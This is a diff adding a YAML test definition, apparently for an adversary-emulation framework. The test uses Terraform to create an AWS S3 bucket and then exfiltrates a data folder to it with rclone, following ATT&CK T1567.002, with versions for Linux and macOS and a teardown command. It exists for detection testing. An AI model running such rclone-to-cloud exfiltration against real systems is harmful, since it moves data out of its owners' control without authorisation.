@@ -1,0 +1,70 @@
+---
+- id: e96eaeff98e12ba975bc2e804fe9bf4a
+  name: Exfiltrate data with rclone to cloud Storage - AWS S3
+  description: 'This test uses rclone to exfiltrate data to a remote cloud storage
+    instance. (AWS S3)
+
+    See https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/
+
+    '
+  tactic: exfiltration
+  technique:
+    attack_id: T1567.002
+    name: 'Exfiltration Over Web Service: Exfiltration to Cloud Storage'
+  platforms:
+    linux:
+      psh:
+        command: Write-Host "Deploying AWS infrastructure... " -NoNewLine; $awsAccessKey
+          = ""; $awsSecretKey = ""; cd PathToAtomicsFolder/T1567.002/src/; if ($awsAccessKey
+          -eq "" -or $awsSecretKey -eq "") {;   $env:AWS_PROFILE = "default"; } else
+          {;   $env:AWS_ACCESS_KEY_ID = "$awsAccessKey";   $env:AWS_SECRET_ACCESS_KEY
+          = "$awsSecretKey"; }; $null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform
+          init; $null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform
+          apply -var "aws_region=us-east-1" -auto-approve; Write-Host "Done!"; Write-Host
+          "Generating rclone config... " -NoNewLine; $config = @"; [exfils3]; type
+          = s3; provider = AWS; env_auth = true; region = us-east-1; "@; $config |
+          Out-File -FilePath "PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf"
+          -Encoding ascii; Write-Host "Done!"; Write-Host "Exfiltrating data... "
+          -NoNewLine; $bucket = "$(PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform
+          output bucket)".Replace("`"",""); cd PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone-v*;
+          $null = ./rclone copy --max-size 1700k "PathToAtomicsFolder/../ExternalPayloads/T1567.002/data/"
+          exfils3:$bucket --config "PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf";
+          Write-Host "Done!"
+        payloads: []
+        cleanup: Write-Host "Destroying AWS infrastructure... " -NoNewLine; $awsAccessKey
+          = ""; $awsSecretKey = ""; cd PathToAtomicsFolder/T1567.002/src/; if ($awsAccessKey
+          -eq "" -or $awsSecretKey -eq "") {;   $env:AWS_PROFILE = "default"; } else
+          {;   $env:AWS_ACCESS_KEY_ID = "$awsAccessKey";   $env:AWS_SECRET_ACCESS_KEY
+          = "$awsSecretKey"; }; $null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform
+          destroy -var "aws_region=us-east-1" -auto-approve; Write-Host "Done!"
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+    darwin:
+      psh:
+        command: Write-Host "Deploying AWS infrastructure... " -NoNewLine; $awsAccessKey
+          = ""; $awsSecretKey = ""; cd PathToAtomicsFolder/T1567.002/src/; if ($awsAccessKey
+          -eq "" -or $awsSecretKey -eq "") {;   $env:AWS_PROFILE = "default"; } else
+          {;   $env:AWS_ACCESS_KEY_ID = "$awsAccessKey";   $env:AWS_SECRET_ACCESS_KEY
+          = "$awsSecretKey"; }; $null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform
+          init; $null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform
+          apply -var "aws_region=us-east-1" -auto-approve; Write-Host "Done!"; Write-Host
+          "Generating rclone config... " -NoNewLine; $config = @"; [exfils3]; type
+          = s3; provider = AWS; env_auth = true; region = us-east-1; "@; $config |
+          Out-File -FilePath "PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf"
+          -Encoding ascii; Write-Host "Done!"; Write-Host "Exfiltrating data... "
+          -NoNewLine; $bucket = "$(PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform
+          output bucket)".Replace("`"",""); cd PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone-v*;
+          $null = ./rclone copy --max-size 1700k "PathToAtomicsFolder/../ExternalPayloads/T1567.002/data/"
+          exfils3:$bucket --config "PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf";
+          Write-Host "Done!"
+        payloads: []
+        cleanup: Write-Host "Destroying AWS infrastructure... " -NoNewLine; $awsAccessKey
+          = ""; $awsSecretKey = ""; cd PathToAtomicsFolder/T1567.002/src/; if ($awsAccessKey
+          -eq "" -or $awsSecretKey -eq "") {;   $env:AWS_PROFILE = "default"; } else
+          {;   $env:AWS_ACCESS_KEY_ID = "$awsAccessKey";   $env:AWS_SECRET_ACCESS_KEY
+          = "$awsSecretKey"; }; $null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform
+          destroy -var "aws_region=us-east-1" -auto-approve; Write-Host "Done!"
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
